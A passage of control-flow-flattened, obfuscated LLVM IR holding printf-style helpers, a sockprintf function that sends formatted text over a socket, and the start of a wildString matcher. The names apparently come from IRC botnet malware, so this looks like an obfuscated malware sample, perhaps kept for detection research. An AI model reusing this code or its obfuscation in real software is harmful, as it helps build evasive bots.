  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 -1574242346, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 -1295062929, i32 1126860284
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 693760420, i32 -1441596362
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
  store i32 2109725719, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 2109725719, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 -1574242346, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 -926530279, i32 -707390597
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 -1359607420, i32 -1473614933
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 -1394830672, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 -1394830672, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 -1574242346, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 -1052167926, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 13100623, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 -1052167926, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 -1574242346, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 -299469099, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 1092153839, i32 -432379845
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 -432379845, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1069707178, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1069707178, label %first
    i32 1886090272, label %16
    i32 1781597071, label %18
    i32 1927330395, label %23
    i32 -943773873, label %26
    i32 -1943126785, label %29
    i32 -1919473277, label %34
    i32 -1545316146, label %35
    i32 -1865681213, label %39
    i32 1867961405, label %44
    i32 -1928548051, label %45
    i32 -1199440941, label %46
    i32 -1610419124, label %51
    i32 -1034336599, label %52
    i32 154352344, label %56
    i32 244560978, label %61
    i32 -877200293, label %64
    i32 -1178960980, label %65
    i32 -1247233354, label %66
    i32 1980005463, label %71
    i32 1399336449, label %78
    i32 1374407307, label %81
    i32 2009736831, label %82
    i32 1740822292, label %86
    i32 -2137752346, label %91
    i32 1436793563, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 1886090272, i32 -1199440941
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 1781597071, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 1927330395, i32 -1943126785
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 -943773873, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 1781597071, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 -1919473277, i32 -1545316146
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -1865681213, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 -1865681213, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 1867961405, i32 -1928548051
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 -1928548051, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -1199440941, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 -1178960980, i32 -1610419124
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -1034336599, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 154352344, i32 -877200293
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 244560978, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 -1034336599, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 -1178960980, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -1247233354, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 1980005463, i32 1374407307
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 1399336449, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 -1247233354, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 2009736831, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 1740822292, i32 1436793563
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 -2137752346, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 2009736831, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1227566612, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1227566612, label %first
    i32 426721286, label %26
    i32 -1198141753, label %34
    i32 1785354242, label %38
    i32 656914802, label %42
    i32 298721125, label %46
    i32 -1262773782, label %49
    i32 -1656734288, label %54
    i32 353004844, label %58
    i32 722346995, label %65
    i32 357142236, label %71
    i32 -1748244871, label %80
    i32 2135893906, label %84
    i32 -77413200, label %88
    i32 -1991498188, label %93
    i32 -1784439957, label %99
    i32 -1370796832, label %102
    i32 1502020056, label %103
    i32 576533703, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 426721286, i32 -1198141753
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 576533703, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 1785354242, i32 -1262773782
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 656914802, i32 -1262773782
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 298721125, i32 -1262773782
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 -1262773782, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 -1656734288, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 353004844, i32 -1748244871
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 722346995, i32 357142236
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 357142236, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 -1656734288, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 2135893906, i32 1502020056
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 -77413200, i32 -1784439957
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 -1991498188, i32 -1784439957
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 -1370796832, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 -1370796832, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 1502020056, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 576533703, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 -917189875, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -917189875, label %first
    i32 -1735300287, label %8
    i32 1793173393, label %16
    i32 916880645, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 -1735300287, i32 1793173393
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 916880645, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 916880645, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.471, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1046692921, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 -1046692921, label %NodeBlock5
    i32 -379413528, label %NodeBlock
    i32 -228437050, label %LeafBlock3
    i32 -629636976, label %LeafBlock1
    i32 424650567, label %LeafBlock
    i32 -592541091, label %14
    i32 -2004292568, label %18
    i32 786365502, label %25
    i32 1444194203, label %31
    i32 1361781638, label %38
    i32 -1636131498, label %39
    i32 1446442480, label %42
    i32 -372266218, label %48
    i32 1769290069, label %56
    i32 -905771844, label %NewDefault
    i32 600139901, label %59
    i32 -1245009137, label %70
    i32 1924741566, label %78
    i32 354204907, label %81
  ]

